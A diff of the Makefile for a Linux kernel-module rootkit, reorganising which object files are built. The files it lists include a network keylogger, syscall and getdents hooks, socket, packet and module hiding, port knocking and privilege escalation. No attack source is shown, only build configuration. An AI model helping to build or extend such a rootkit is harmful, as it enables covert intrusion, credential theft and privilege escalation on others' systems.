@@ -2,8 +2,7 @@
 ROOTKIT		:= rootkit
 
 # Build
-UNAME 		:= $(shell uname -r)
-MODULEDIR	:= /lib/modules/$(UNAME)
+MODULEDIR	:= /lib/modules/$(shell uname -r)
 BUILDDIR	:= $(MODULEDIR)/build
 KERNELDIR 	:= $(MODULEDIR)/kernel
 
@@ -17,27 +16,43 @@ SRCS_H		:= $(PWD)/$(SRCS_S)/headers
 LIBS_H		:= $(PWD)/$(LIBS_S)/headers
 INCL_H		:= $(PWD)/$(INCL_S)/headers
 
+# See below for explanation.
+#
 # Files
-CORE		:= src/core.c
-CORE_OBJS	:= $(patsubst %.c, %.o, $(CORE))
-SRCS		:= $(filter-out $(CORE), $(wildcard $(SRCS_S)/*.c))
-SRCS_OBJS	:= $(patsubst %.c, %.o, $(SRCS))
-LIBS		:= $(wildcard $(LIBS_S)/*.c)
-LIBS_OBJS	:= $(patsubst %.c, %.o, $(LIBS))
-INCL 		:= $(wildcard $(INCL_S)/*.c)
-INCL_OBJS	:= $(patsubst %.c, %.o, $(INCL))
+# CORE		:= src/core.c
+# CORE_OBJS	:= $(patsubst %.c, %.o, $(CORE))
+# SRCS_OBJS	:= $(patsubst %.c, %.o, $(filter-out $(CORE), $(wildcard $(SRCS_S)/*.c)))
+# LIBS_OBJS	:= $(patsubst %.c, %.o, $(wildcard $(LIBS_S)/*.c))
+# INCL_OBJS	:= $(patsubst %.c, %.o, $(wildcard $(INCL_S)/*.c))
 
 # Module
-obj-m 			:= $(ROOTKIT).o
+obj-m 		:= $(ROOTKIT).o
 
-# Not working
+# Not working, reason unknown.
+# https://stackoverflow.com/questions/46241141/makefile-lkm-sources-as-variables-not-working
+#
 # $(ROOTKIT)-y	+= $(CORE_OBJS) $(SRCS_OBJS) $(LIBS_OBJS) $(INCL_OBJS)
 
-$(ROOTKIT)-y 	+= src/core.o src/libs/syscalltable.o src/network_keylog.o src/server.o 
-$(ROOTKIT)-y 	+= src/module_hiding.o src/getdents_hook.o src/socket_hiding.o src/packet_hiding.o 
-$(ROOTKIT)-y 	+= src/port_knocking.o src/privilege_escalation.o src/include/utils.o
+# Core
+$(ROOTKIT)-y 	+= src/core.o
 
-ccflags-y		:= -I$(SRCS_H) -I$(LIBS_H) -I$(INCL_H)
+# Source
+$(ROOTKIT)-y 	+= src/server.o
+$(ROOTKIT)-y 	+= src/network_keylog.o
+$(ROOTKIT)-y 	+= src/getdents_hook.o
+$(ROOTKIT)-y 	+= src/socket_hiding.o
+$(ROOTKIT)-y 	+= src/packet_hiding.o
+$(ROOTKIT)-y 	+= src/port_knocking.o
+$(ROOTKIT)-y 	+= src/privilege_escalation.o
+$(ROOTKIT)-y 	+= src/module_hiding.o
+
+# Libs
+$(ROOTKIT)-y 	+= src/libs/syscalltable.o
+
+# Include
+$(ROOTKIT)-y 	+= src/include/utils.o
+
+ccflags-y	:= -I$(SRCS_H) -I$(LIBS_H) -I$(INCL_H)
 
 # Recipes
 all:
